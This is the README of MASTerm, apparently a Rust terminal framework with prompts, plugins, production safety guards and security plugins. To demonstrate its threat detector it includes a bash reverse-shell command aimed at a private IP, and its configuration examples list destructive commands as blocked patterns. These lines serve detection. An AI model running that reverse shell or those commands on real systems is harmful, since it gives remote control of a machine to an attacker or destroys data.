<p align="center">
  <img src="https://img.shields.io/badge/MASTerm-Master%20your%20Terminal-blueviolet?style=for-the-badge&logo=terminal&logoColor=white" alt="MASTerm">
</p>

<h1 align="center">
  <br>
  🚀 MASTerm
  <br>
</h1>

<h4 align="center">
  <strong>Master your Terminal</strong> — A blazing fast, intelligent, cross-shell terminal framework built in Rust.
</h4>

<p align="center">
  <a href="DOCUMENTATION.md"><strong>📚 Documentation</strong></a> •
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-features">Features</a> •
  <a href="#-installation">Installation</a> •
  <a href="#-shell-setup">Shell Setup</a> •
  <a href="#-usage">Usage</a> •
  <a href="#-plugins">Plugins</a> •
  <a href="#-configuration">Configuration</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Rust-1.70+-orange?logo=rust&logoColor=white" alt="Rust">
  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
  <img src="https://img.shields.io/badge/Platform-macOS%20%7C%20Linux%20%7C%20Windows-blue" alt="Platform">
  <img src="https://img.shields.io/badge/Shells-Zsh%20%7C%20Bash%20%7C%20Fish%20%7C%20PowerShell-cyan" alt="Shells">
  <img src="https://img.shields.io/github/stars/singhalmridul/MASTerm?style=social" alt="Stars">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Lines%20of%20Code-35%2C000+-brightgreen" alt="LOC">
  <img src="https://img.shields.io/badge/Crates-6-blue" alt="Crates">
  <img src="https://img.shields.io/badge/Plugins-21-purple" alt="Plugins">
</p>

---

## 🎯 Quick Start

Run the interactive installer to set up MASTerm and choose your features:

```bash
# One-command install (macOS/Linux)
curl -fsSL https://raw.githubusercontent.com/singhalmridul/MASTerm/main/install.sh | bash

# Configure your experience (Recommended)
masterm setup

# Restart your terminal, and you're done! ✨
```

---

## ⚡ Why MASTerm?

<table>
<tr>
<td width="50%">

### 🏎️ Performance

| Metric | MASTerm | Oh My Zsh |
|--------|---------|-----------|
| Startup | **< 50ms** | 200-500ms |
| Prompt | **< 30ms** | 50-100ms |
| Memory | **~5MB** | ~50MB |

</td>
<td width="50%">

### 🎯 Capabilities

| Feature | MASTerm | Others |
|---------|---------|--------|
| Cross-Shell | ✅ | ❌ |
| Zero Config | ✅ | ❌ |
| Prod Safety | ✅ | ❌ |
| Enterprise | ✅ | ❌ |

</td>
</tr>
</table>

---

## ✨ Features

### 🧙 Interactive Setup Wizard
Just like Powerlevel10k, but simpler. Run `masterm setup` to visually configure:
- 🎨 Color Themes
- ⚡ Safety Levels
- ☁️ Cloud Sync

### 👋 Beautiful Welcome Screen
Greet your day with style. `masterm welcome` shows a stunning ASCII banner and real-time system stats (CPU/RAM) every time you open a new terminal.

### 🎨 Beautiful, Informative Prompts

```
~/projects/api  main +2 ~1  v18.19.0  15ms
❯ _
```

Your prompt shows everything at a glance:
- 📁 Current directory
- 🔀 Git branch & status
- 📦 Language versions (Node, Python, Rust, Go)
- ⏱️ Command duration
- ⚠️ Production warnings

### 🖥️ Feature-Rich TUI Dashboard
Running `masterm dashboard` opens a powerful terminal interface:
- **System Monitor**: Real-time CPU & Memory usage graphs.
- **Config Editor**: View and inspect your configuration.
- **Plugin Manager**: Manage built-in and WASM plugins.

### ☁️ Cloud Sync
Sync your configuration across machines using GitHub Gists:
```bash
masterm sync push    # Backup config
masterm sync pull    # Restore config
```

### 🔍 Zero-Config Intelligence

MASTerm automatically detects and displays context:

| Context | Auto-Detects |
|---------|--------------|
| **Git** | Branch, status, ahead/behind, stash count |
| **Node.js** | Version, package name |
| **Python** | Version, virtualenv |
| **Rust** | Version, crate name |
| **Go** | Version, module name |
| **Docker** | Container context |
| **Kubernetes** | Current context |
| **Environment** | Dev / Staging / Production |

### 🛡️ Production Safety Guards

```
╔═══════════════════════════════════════════════════════════╗
║  ⚠️  PRODUCTION ENVIRONMENT DETECTED                      ║
╠═══════════════════════════════════════════════════════════╣
║  You are about to run: rm -rf logs/                       ║
║                                                           ║
║  Type 'yes' to confirm, or Ctrl+C to cancel:              ║
╚═══════════════════════════════════════════════════════════╝
```

### 🎯 Multiple Modes

| Mode | Description | Use Case |
|------|-------------|----------|
| `minimal` | Fastest startup, basic prompt | Quick tasks |
| `dev` | Git + language detection | Daily development |
| `ops` | All guards enabled | Production work |

### 🔐 Enterprise-Grade Security

MASTerm includes 10 built-in security plugins for threat detection and command auditing:

```bash
$ masterm security check -- "bash -i >& /dev/tcp/10.0.0.1/4444"
  ⚠️  Threats Detected:
     🐚 Reverse Shell - Bash reverse shell
  Risk Level: Critical
```

| Plugin | Protection |
|--------|------------|
| **Secret Detection** | Blocks leaked API keys, tokens, passwords |
| **Audit Logging** | Forensic-grade command logging with hash chains |
| **Privilege Escalation** | Environment-aware sudo/su warnings |
| **Suspicious Patterns** | Detects reverse shells, encoded commands |
| **Network Monitor** | Tracks outbound connections |
| **Package Audit** | Typosquatting detection, malicious package blocklist |
| **File Integrity** | Alerts on .ssh, .env, /etc/shadow access |
| **SSH/GPG Monitor** | Key generation, export, deletion alerts |
| **IP Reputation** | Threat intelligence integration |
| **Sandbox Mode** | Restricted execution environment |

```bash
masterm security status     # View security dashboard
masterm security patterns   # View detection patterns
masterm security audit show # View audit logs
```

See [SECURITY.md](SECURITY.md) for detailed documentation.

## 📦 Installation

### Quick Install (Recommended)

One command installs everything:

```bash
# Using curl (macOS/Linux)
curl -fsSL https://raw.githubusercontent.com/singhalmridul/MASTerm/main/install.sh | bash

# Using wget
wget -qO- https://raw.githubusercontent.com/singhalmridul/MASTerm/main/install.sh | bash

# Specify shell explicitly
curl -fsSL https://raw.githubusercontent.com/singhalmridul/MASTerm/main/install.sh | bash -s -- --shell zsh
```

**What it does:**
1. ✅ Installs Rust (if needed)
2. ✅ Builds MASTerm from source
3. ✅ Creates config files
4. ✅ Sets up your shell

### From Source

```bash
# Clone
git clone https://github.com/singhalmridul/MASTerm.git
cd MASTerm

# Build & Install
cargo build --release
cargo install --path crates/masterm-cli

# Setup
masterm install
```

### Verify Installation

```bash
masterm --version    # Check version
masterm doctor       # Run diagnostics
```

---

## 🐚 Shell Setup

MASTerm supports **Zsh**, **Bash**, **Fish**, and **PowerShell**.

### Automatic (Recommended)

```bash
masterm install              # Auto-detect shell
masterm install --shell zsh  # Specific shell
```

### Manual Setup

<details>
<summary><strong>🔷 Zsh</strong> — Add to <code>~/.zshrc</code></summary>

```zsh
# Cargo PATH
export PATH="$HOME/.cargo/bin:$PATH"

# MASTerm
eval "$(masterm init zsh)"
```

</details>

<details>
<summary><strong>🟢 Bash</strong> — Add to <code>~/.bashrc</code></summary>

```bash
# Cargo PATH
export PATH="$HOME/.cargo/bin:$PATH"

# MASTerm
eval "$(masterm init bash)"
```

</details>

<details>
<summary><strong>🐟 Fish</strong> — Add to <code>~/.config/fish/config.fish</code></summary>

```fish
# Cargo PATH
set -gx PATH $HOME/.cargo/bin $PATH

# MASTerm
masterm init fish | source
```

</details>

<details>
<summary><strong>💠 PowerShell</strong> — Add to <code>$PROFILE</code></summary>

```powershell
# Cargo PATH
$env:PATH = "$env:USERPROFILE\.cargo\bin;$env:PATH"

# MASTerm
Invoke-Expression (& masterm init powershell)
```

</details>

After setup, run `exec $SHELL` or restart your terminal.

---

## 🎮 Usage

### Essential Commands

| Command | Description |
|---------|-------------|
| `masterm doctor` | Check installation health |
| `masterm mode <mode>` | Switch modes (minimal/dev/ops) |
| `masterm config edit` | Edit configuration |
| `masterm config show` | Show current config |
| `masterm plugins list` | List all plugins |
| `masterm cache clear` | Clear cache |
| `masterm profile startup` | Profile performance |

### Mode Switching

```bash
masterm mode            # Show current mode
masterm mode minimal    # Fastest, basic prompt
masterm mode dev        # Balanced (default)
masterm mode ops        # Maximum safety
```

### Shell Completions

```bash
masterm completions zsh > ~/.zsh/completions/_masterm
masterm completions bash > /etc/bash_completion.d/masterm
masterm completions fish > ~/.config/fish/completions/masterm.fish
```

---

## 🔌 Plugins

### Built-in Plugins (11 total)

| Plugin | Trigger | Shows |
|--------|---------|-------|
| `git` | `.git/` | Branch, status, ahead/behind |
| `env` | Always | Dev/staging/prod indicator |
| `prod-guard` | Production env | Safety warnings |
| `node` | `package.json` | Node.js version |
| `python` | `pyproject.toml` | Python version, venv |
| `go` | `go.mod` | Go version |
| `rust` | `Cargo.toml` | Rust version |
| `docker` | `Dockerfile` | Docker context |
| `kubernetes` | kubectl available | K8s context |
| `java` | `pom.xml` | Java version |

### Plugin Marketplace
Discover and install plugins from the community registry:

```bash
masterm plugins search docker   # Search registry
masterm plugins install docker-context # Install plugin
masterm plugins list            # List installed
```

### Manual Management

```bash
masterm plugins list           # List all
masterm plugins enable git     # Enable
masterm plugins disable java   # Disable
masterm plugins info git       # Details
```

### Plugin Configuration

```toml
# ~/.masterm.toml

[plugins]
enabled = ["git", "node", "python"]
disabled = ["java"]

[plugins.git]
show_stash = true
show_ahead_behind = true
truncate_branch = 30

[plugins.ext]
# MASTerm supports loading external WASM plugins from ~/.masterm/plugins
wasm_enabled = true
```

---

## ⚙️ Configuration

### Config Hierarchy

1. **Enterprise** — `/etc/masterm/enterprise.toml`
2. **User** — `~/.masterm.toml`
3. **Project** — `.masterm.toml`

### Full Configuration Reference

```toml
# ~/.masterm.toml

[core]
mode = "dev"                    # minimal | dev | ops
log_level = "warn"              # trace | debug | info | warn | error

[prompt]
format = "powerline"            # powerline | simple | minimal
add_newline = true
left = ["directory", "git_branch", "git_status"]
right = ["cmd_duration"]

[prompt.icons]
mode = "auto"                   # auto | nerd | unicode | ascii | none

[prompt.colors]
theme = "catppuccin"            # catppuccin | dracula | nord

[plugins]
enabled = []
disabled = []

[safety]
prod_detection = true
prod_patterns = ["**/prod/**", "**/production/**"]
dangerous_commands = ["rm -rf", "DROP DATABASE", "kubectl delete"]
warning_style = "banner"

[cache]
ttl = 300
max_size = 100
```

---

## 🎨 Themes

### Built-in Themes

| Theme | Colors |
|-------|--------|
| **Catppuccin** (default) | Soft pastels, easy on eyes |
| **Dracula** | Vibrant purple/pink |
| **Nord** | Cool arctic blues |

```toml
[prompt.colors]
theme = "catppuccin"  # or "dracula" or "nord"
```

### Icon Modes

| Mode | Description |
|------|-------------|
| `auto` | Detect Nerd Fonts, fallback gracefully |
| `nerd` | Force Nerd Font icons |
| `unicode` | Unicode symbols |
| `ascii` | Plain ASCII (most compatible) |
| `none` | No icons |

---

## 🏢 Enterprise Features

For organizations and teams:

```toml
# /etc/masterm/enterprise.toml

[enterprise]
enabled = true
org_id = "your-company"

[lockdown]
locked_settings = ["safety.prod_detection", "telemetry.enabled"]

[plugins]
allowlist = ["git", "env", "prod-guard"]
denylist = ["untrusted-plugin"]

[safety]
force_prod_patterns = ["/var/www/**"]
force_dangerous_commands = ["rm -rf /"]
```

---

## 🔧 Troubleshooting

### Quick Diagnostics

```bash
masterm doctor
```

### Common Issues

<details>
<summary><strong>Prompt not showing</strong></summary>

1. Check PATH: `which masterm`
2. Re-run: `masterm install`
3. Reload: `exec $SHELL`

</details>

<details>
<summary><strong>Icons not displaying</strong></summary>

Install a [Nerd Font](https://www.nerdfonts.com/) or use:
```toml
[prompt.icons]
mode = "unicode"  # or "ascii"
```

</details>

<details>
<summary><strong>Slow startup</strong></summary>

```bash
masterm profile startup    # See what's slow
masterm mode minimal       # Use minimal mode
```

</details>

---

## 📊 Project Stats

| Metric | Value |
|--------|-------|
| **Language** | Rust 🦀 |
| **Lines of Code** | ~35,000 |
| **Crates** | 6 |
| **Plugins** | 21 built-in (11 context + 10 security) |
| **Shells** | 4 supported |
| **CLI Commands** | 13 |

### Architecture

```
masterm/
├── crates/
│   ├── masterm-core      # Core engine (config, context, prompt)
│   ├── masterm-cli       # CLI binary (13 commands)
│   ├── masterm-plugins   # Built-in plugins (21 plugins)
│   ├── masterm-security  # Security library (patterns, audit, reputation)
│   ├── masterm-shell     # Shell adapters (4 shells)
│   └── masterm-tui       # Terminal UI dashboard
├── scripts/              # Installation scripts
└── install.sh            # One-command installer
```

---

## 🤝 Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md).

```bash
git clone https://github.com/singhalmridul/MASTerm.git
cd MASTerm
cargo build
cargo test
cargo run -- doctor
```

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<p align="center">
  <strong>MASTerm</strong> — Master your Terminal ⚡
  <br><br>
  <a href="https://github.com/singhalmridul/MASTerm">GitHub</a> •
  <a href="https://github.com/singhalmridul/MASTerm/issues">Issues</a> •
  <a href="https://github.com/singhalmridul/MASTerm/discussions">Discussions</a>
  <br><br>
  Made with ❤️ by <a href="https://github.com/singhalmridul">Mridul Singhal</a>
</p>
